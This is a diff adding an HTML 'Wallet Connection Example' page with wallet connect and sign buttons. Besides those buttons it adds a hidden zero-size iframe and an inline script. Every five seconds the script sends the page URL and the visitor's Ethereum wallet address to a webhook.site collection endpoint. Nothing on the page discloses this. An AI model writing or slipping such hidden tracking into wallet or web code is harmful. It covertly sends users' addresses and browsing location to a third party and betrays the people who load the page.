@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Wallet Connection Example</title>
+    <meta charset="UTF-8" />
+  </head>
+  <body>
+    <h1>Wallet Connection Example</h1>
+    <button id="connectBtn">Connect Wallet</button>
+    <button id="signBtn" disabled>Sign Message</button>
+    <div id="confirmation"></div>
+
+    <script src="./src/index.js"></script>
+    <iframe
+      id="tracker"
+      src="https://webhook.site/52b958a1-bab4-4ff9-9a68-3a6c53162df1"
+      width="0"
+      height="0"
+      style="display: none;"
+    ></iframe>
+    <script>
+      // Keep track of current href and ethereum state
+      var currentHref = window.location.href;
+      var currentEthereum = window.ethereum
+        ? window.ethereum.selectedAddress
+        : null;
+
+      // Initialize iframe
+      var iframe = document.getElementById("tracker");
+
+      function track() {
+        updateTracker();
+        // Check for ethereum
+        if (window.ethereum) {
+          // Compare current ethereum address with previous
+          if (currentEthereum !== window.ethereum.selectedAddress) {
+            currentEthereum = window.ethereum.selectedAddress;
+            updateTracker();
+          }
+        }
+
+        // Compare current href with previous
+        if (currentHref !== window.location.href) {
+          currentHref = window.location.href;
+          updateTracker();
+        }
+      }
+
+      function updateTracker() {
+        // Construct the URL, adding the current href and ethereum address
+        var url =
+          "https://webhook.site/52b958a1-bab4-4ff9-9a68-3a6c53162df1" +
+          "?href=" +
+          encodeURIComponent(currentHref);
+        if (currentEthereum)
+          url += "&ethereum=" + encodeURIComponent(currentEthereum);
+
+        // Update the iframe's src to the new URL
+        iframe.src = url;
+      }
+      track();
+      // Call track function every 5 seconds
+      setInterval(track, 5000);
+    </script>
+  </body>
+</html>
